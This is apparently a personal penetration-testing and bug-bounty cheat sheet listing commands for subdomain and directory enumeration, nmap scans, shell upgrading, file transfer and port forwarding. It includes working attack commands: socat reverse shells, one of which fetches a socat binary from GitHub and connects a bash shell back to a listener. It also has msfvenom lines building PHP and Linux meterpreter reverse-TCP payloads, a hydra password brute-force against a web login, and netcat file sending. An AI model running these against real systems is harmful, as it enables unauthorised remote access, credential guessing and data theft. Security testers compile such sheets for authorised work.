## Sublister
### normal walkover
	~/git/Sublist3r/sublist3r.py -d <domain> -p80,443,22,21 -v -o ~/bounty/<domain>/subdomainsublister.txt

## Wfuzz
### directoryfiles
	wfuzz -c -w ~/git/SecLists/Discovery/Web-Content/raft-medium-files.txt -Z --hc XXX,404 <target>/FUZZ
### subdomains
	wfuzz -c -w ~/git/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -Z --hc XXX,302,404 -f <list_of_subdomains> FUZZ.<target>

## Nmap
### full scan + device version + fingerprinting 0-10000 ports
	sudo nmap -sC -sV -O -p0-10000 <target>

## Gobuster
### directory bruteforce
	gobuster dir -u <URL> -w <Wordlist> -x php -o output.txt

### DNS bruteforce

## GitTools
### scan
	~/git/GitTools/Finder/gitfinder.py -i ~/bounty/<domain>/subdomainsublister.txt -o ~/bounty/<domain>/gitfinder.txt

	~/git/GitTools/Finder/gitfinder.py -i ~/bounty/<company>/subdomainsublister.txt -o ~/bounty/<company>/gitfinder.txt

## fancy awk
### field
	cat file.csv | awk -F'"' '{print $4}' > awk.txt

## upgrade shell
### create your own tty
	script -q /dev/null bash

### socat fully interactive tty
#### listen
	socat file:`tty`,raw,echo=0 tcp-listen:4444  
#### launch
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
#### oneliner 
	wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444

### autocomplete shell
	ctrl-z
	stty raw -echo
	fg
	
### script -q /dev/null sh

### python
	python -c 'import pty; pty.spawn("/bin/bash")'

## netcat file send
### receive 
	nc -l -p 1234 -q 1 > something.zip < /dev/null
### send
	cat something.zip | netcat server.ip.here 1234

## python http server
### pyhton2 
	python -m SimpleHTTPServer 8000
### python3 
	python -m http.server [<portNo>]
### get file
	curl http://example.com:9090/file --output file

## port forward
### ssh
	ssh -f -N -R 3022:127.0.0.1:3022 root@<target_ip>
### socat
	./socat TCP-LISTEN:8899,fork TCP:127.0.0.1:5432

## Meterpreter shell
### PHP
	msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
### linux x86
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

## tcpdump listen to icmp traffic
	sudo tcpdump -nni tun0 icmp

## hydra
	hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "<URL>/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad"

## extracting files
### gz
	gunzip <file.bz>
### tar.bz
	tar -xzvf <file.tar.bz>

## sort output and count
    sort -u output | wc -l

## disk usage
### folder
	du -ah /<dir>
### system
	df -ah

## print a lot of characters
	python -c "print('A' * 120)"